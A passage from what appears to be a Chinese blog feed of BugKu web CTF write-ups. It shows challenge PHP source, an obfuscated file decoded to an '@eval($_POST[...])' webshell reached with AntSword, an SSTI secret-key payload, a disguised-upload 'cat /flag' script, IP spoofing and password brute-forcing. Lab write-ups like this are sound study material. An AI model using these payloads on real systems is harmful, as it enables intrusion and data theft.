class="line">%22%3Bif(!%24_GET%5B&#x27;id&#x27;%5D)%0A%7B%0A%09header(&#x27;Location%3A%20hello.php%3Fid%3D1&#x27;)%3B%0A%09exit()%3B%0A%7D%0A%24id%3D%24_GET%5B&#x27;id&#x27;%5D%3B%0A%24a%3D%24_GET%5B&#x27;a&#x27;%5D%3B%0A%24b%3D%24_GET%5B&#x27;b&#x27;%5D%3B%0Aif(stripos(%24a%2C&#x27;.&#x27;))%0A%7B%0A%09echo%20&#x27;no%20no%20no%20no%20no%20no%20no&#x27;%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20%40file_get_contents(%24a%2C&#x27;r&#x27;)%3B%0Aif(%24data%3D%3D%22bugku%20is%20a%20nice%20plateform!%22%20and%20%24id%3D%3D0%20and%20strlen(%24b)%3E5%20and%20eregi(%22111%22.substr(%24b%2C0%2C1)%2C%221114%22)%20and%20substr(%24b%2C0%2C1)!%3D4)%0A%7B%0A%09%24flag%20%3D%20%22flag%7B***********%7D%22%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20!!!%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure><p>再次进行url解码即可得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="comment">//id不能为空</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>)) <span class="comment">//a中不能含有&#x27;.&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>); <span class="comment">//可以利用，php://input</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;***********&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload放入burp发送(参考<a href="https://blog.csdn.net/qq_41333578/article/details/92759619">wp</a>)</p><p><img src="https://s2.loli.net/2022/04/25/dcgGBNpu6atPL97.png" alt="never3.png"></p><h2 id="各种绕过哟"><a href="#各种绕过哟" class="headerlink" title="各种绕过哟"></a>各种绕过哟</h2><p><img src="https://s2.loli.net/2022/04/25/odAQMfma1OIHBbU.png" alt="bypass.png"></p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/weixin_46578840/article/details/120140214?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&utm_relevant_index=4">wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123962077">wp2</a></p></blockquote><p>发现php混淆后的代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">3</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">6</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">33</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">33</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">10</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">10</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV</span> = <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">0</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">18</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">3</span>&#125; . <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">0</span>&#125; . <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">1</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">7</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span>.= <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">22</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">36</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">29</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">26</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">32</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">35</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">26</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span>(<span class="string">&quot;&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解码（我是一步步用base64解码的，主要是找到eval里面的内容，注意是有一次解码会出现两段php代码，第二段才是要的源码)，下面代码运行后即可获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// define(&#x27;njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT&#x27;,pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn);</span></span><br><span class="line"><span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$HbXdtGUkeEDlRgpwsarfnVYoTSKIcPvhCWjBizQLZxFMuymANqJO</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>=<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="variable">$HbXdtGUkeEDlRgpwsarfnVYoTSKIcPvhCWjBizQLZxFMuymANqJO</span>.=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">36</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>=<span class="string">&quot;WtCxsqEuLNTSGRkVfZKHjUYPIognBiFhrbyOXacAelmwpJdzvQDMFbRYnLeWuGTKsNZvOpcgErtXBxCQljVfDwSmyqHikPMzdJaIoAhUXh9zqgiGRMfdp2fnqFaxaV9MqFYPcs5LvQPIAPd2kgJUq0pppe5opMGQN3vfa0NctMYzT1GNNrfKvF1uqrVxkZPhpyNATyVtv1Admz0cAsv2tFzxJV9AT1GrF3PbwsPIqyGdH2Pow2bacTn=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>(<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>*<span class="number">2</span>),<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>),<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="number">0</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用中国蚁剑连接（使用插件disable_functions），连接后发现只能看html目录下的东西。</p><p><img src="https://s2.loli.net/2022/04/25/ti2E6mdAYTXsfqB.png" alt="getshell1.png"></p><p>用蚁剑连接 .antproxy.php</p><p><img src="https://s2.loli.net/2022/04/25/BQ28ELpHonSjU3O.png" alt="getshell2.png"></p><p>根目录下找到flag</p><p><img src="https://s2.loli.net/2022/04/25/jYuGEBn4b382MNH.png" alt="getshell3.png"></p><p><img src="https://s2.loli.net/2022/04/25/ucUkJHMwlmhVyXZ.png" alt="getshell4.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web 刷题记录1</title>
      <link href="/2022/04/24/BugKu-Web1/"/>
      <url>/2022/04/24/BugKu-Web1/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-刷题记录1"><a href="#BugKu-Web-刷题记录1" class="headerlink" title="BugKu Web 刷题记录1"></a>BugKu Web 刷题记录1</h1><blockquote><p>参考：</p><p><a href="https://www.secpulse.com/archives/137663.html">BugKu-Web-wp1</a></p><p><a href="https://www.secpulse.com/archives/140522.html">BugKu-Web-wp2</a></p><p><a href="https://www.secpulse.com/archives/146728.html">BugKu-Web-wp3</a></p><p><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></p></blockquote><h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><p>F12查看源码</p><p><img src="https://s2.loli.net/2022/04/24/XbFRket7Y6Kl4C8.png" alt="SSTI1.png"></p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:17350/?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/l3KfC9Ap51EM8vr.png" alt="SSTI11.png"></p><h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h2><p><img src="https://s2.loli.net/2022/04/24/7d1ugKRv3ZNfxas.png" alt="SSTI2.png"></p><h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>创建111.txt并输入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p>修改文件名为111.jpg后上传文件即可得到flag</p><p><img src="https://s2.loli.net/2022/04/24/A7mIp28bU3tLDyT.png" alt="flaskfileupload.png"></p><h2 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h2><p><img src="https://s2.loli.net/2022/04/24/Mewq2vpiEzYT7mg.png" alt="huaji1.png"></p><p>F12后，ctrl+f搜索flag即可</p><p><img src="https://s2.loli.net/2022/04/24/F78NBcCUD1szXb9.png" alt="huaji.png"></p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>F12，修改长度限制，随后输入正确计算结果即可。</p><p><img src="https://s2.loli.net/2022/04/24/Waq4kS6ZLHjeoNl.png" alt="jisuanqi.png"></p><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p><img src="https://s2.loli.net/2022/04/24/Npb6VZol3mInsBH.png" alt="GET.png"></p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="https://s2.loli.net/2022/04/24/B7LzEGeklKOoWrn.png" alt="POST.png"></p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>第一个条件是不能为数字，第二个条件是&#x3D;&#x3D;比较，和整型比较是会先把字符串转化为整型，’1admin’在比较时候会变成1</p><p><img src="https://s2.loli.net/2022/04/24/5Ol9HLuM1oeRhkN.png" alt="maodun.png"></p><h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>查看源代码</p><p><img src="https://s2.loli.net/2022/04/24/FsegtnxZPRb9rJa.png" alt="alert1.png"></p><p>放到html中显示</p><p><img src="https://s2.loli.net/2022/04/24/hfzmJFR91PDweGs.png" alt="alert2.png"></p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>burp suite抓包</p><p><img src="https://s2.loli.net/2022/04/24/NwaztUknmE8bplS.png" alt="pleasestop.png"></p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>关键在于这一句</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>); </span><br></pre></td></tr></table></figure><p>故传入args&#x3D;GLOBALS,最后会输出​GLOBALS,flag就在其中</p><p><img src="https://s2.loli.net/2022/04/24/syhBUpZaqRP7n1d.png" alt="var1.png"></p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>抓包查看响应包</p><p><img src="https://s2.loli.net/2022/04/24/yvD9piJZXMmFKQt.png" alt="head.png"></p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>提示有无后门，用御剑扫描一下发现shell.php</p><p><img src="https://s2.loli.net/2022/04/24/PbH69l3sUem4DoV.png" alt="webhack1.png"></p><p>进入后发现需要输入密码</p><p><img src="https://s2.loli.net/2022/04/24/8tbwWkHPKyhC47V.png" alt="webhack2.png"></p><p>用burp爆破获得密码</p><p><img src="https://s2.loli.net/2022/04/24/uzrAfldKvnTo4B7.png" alt="webhack3.png"></p><p>输入密码后得到flag</p><p><img src="https://s2.loli.net/2022/04/24/8dpoyg6bMSNfELr.png" alt="webhack4.png"></p><h2 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h2><p>F12查看发现编码</p><p><img src="https://s2.loli.net/2022/04/24/MmrcLXi34WOEzKI.png" alt="localadmin1.png"></p><p>放进base64中解密得到密码，由于是管理员，故猜测账户为admin</p><p><img src="https://s2.loli.net/2022/04/24/ZjtPILEszfDlwkV.png" alt="localadmin2.png"></p><p>输入后发现ip被ban</p><p><img src="https://s2.loli.net/2022/04/24/x9lPEfVbmnZzwHX.png" alt="localadmin3.png"></p><p>使用burp进行ip伪造获取flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR:127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/j2W6BIwP4nO79hE.png" alt="localadmin4.png"></p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>F12查看得到代码</p><p><img src="https://s2.loli.net/2022/04/24/O2yuU3kj7dmB4Kx.png" alt="sourcecode1.png"></p><p>用以下代码解码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="string">&#x27;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">&#x27;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">&#x27;%35%34%61%61%32&#x27;</span> + p2))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/BDo9MWTAtYE5Xk1.png" alt="sourcecode2.png"></p><p>输入密码即可得到flag</p><p><img src="https://s2.loli.net/2022/04/24/1XUKFIPmZH5we7V.png" alt="sourcecode3.png"></p><h2 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h2><p>根据提示（z?????）猜测为z开头的6位密码，直接用burp爆破（注意加上标记code: ‘bugku10000’，不然所有返回字段都相同）</p><p><img src="https://s2.loli.net/2022/04/24/ifEnaDS5juJv9o6.png" alt="bp.png"></p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>使用扫描工具扫描（<a href="https://github.com/WangYihang/SourceLeakHacker">SourceLeakHacker</a>）</p><p><img src="https://s2.loli.net/2022/04/24/FSgYfPL5q2m1xR3.png" alt="beifen1.png"></p><p>输入&#x2F;index.php.bak后缀下载得到源文件index.php.bak</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);  <span class="comment">//strstr 获得URI从&#x27;?&#x27;往后(包括&#x27;?&#x27;)的字符串</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>); <span class="comment">//substr 去掉&#x27;?&#x27;</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>); <span class="comment">//把$str中的所有key去掉</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>); <span class="comment">//把字符串解析到变量里</span></span><br><span class="line"><span class="keyword">echo</span> 